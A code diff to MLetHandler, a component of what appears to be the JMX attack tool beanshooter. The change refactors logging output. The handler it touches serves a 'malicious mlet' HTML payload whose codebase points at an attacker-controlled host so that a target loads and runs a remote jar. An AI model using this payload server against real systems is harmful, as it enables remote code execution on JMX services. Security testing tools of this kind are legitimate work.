@@ -6,6 +6,8 @@ import java.io.OutputStream;
 import com.sun.net.httpserver.HttpExchange;
 import com.sun.net.httpserver.HttpHandler;
 
+import de.qtc.beanshooter.io.Logger;
+
 
 public class MLetHandler implements HttpHandler {
 
@@ -15,7 +17,7 @@ public class MLetHandler implements HttpHandler {
     String mBeanClass = null;
     String objectName = null;
 
-    public MLetHandler(String host, String port, String beanClass, String jarName, String objectName) 
+    public MLetHandler(String host, String port, String beanClass, String jarName, String objectName)
     {
         this.host = host;
         this.port = port;
@@ -24,18 +26,32 @@ public class MLetHandler implements HttpHandler {
         this.objectName = objectName;
     }
 
-    public void handle(HttpExchange t) throws IOException 
+    public void handle(HttpExchange t) throws IOException
     {
-        System.out.println("[+] \tReceived request for /mlet");
+        Logger.print("Received request for ");
+        Logger.eprintlnPlain_ye("/mlet");
 
         String response = "<HTML><mlet code=\"%s\" archive=\"%s\" name=\"%s\" codebase=\"http://%s:%s\"></mlet></HTML>";
         response = String.format(response, this.mBeanClass, this.jarName, this.objectName, this.host, this.port);
 
-        System.out.println("[+] \tSending malicious mlet:\n[+]");
-        System.out.println("[+] \t\tClass:\t\t" + this.mBeanClass);
-        System.out.println("[+] \t\tArchive:\t" + this.jarName);
-        System.out.println("[+] \t\tObject:\t\t" + this.objectName);
-        System.out.println("[+] \t\tCodebase:\thttp://" + this.host + ":" + this.port + "\n[+]");
+        Logger.println("Sending malicious mlet:");
+        Logger.println("");
+        Logger.increaseIndent();
+
+        Logger.print("Class:\t\t");
+        Logger.printlnPlain_bl(this.mBeanClass);
+
+        Logger.print("Archive:\t");
+        Logger.printlnPlain_bl(this.jarName);
+
+        Logger.print("Object:\t\t");
+        Logger.printlnPlain_bl(this.objectName);
+
+        Logger.print("Codebase:\t");
+        Logger.printlnPlain_bl("http://" + this.host + ":" + this.port);
+
+        Logger.println("");
+        Logger.decreaseIndent();
 
         t.sendResponseHeaders(200, response.length());
         OutputStream os = t.getResponseBody();
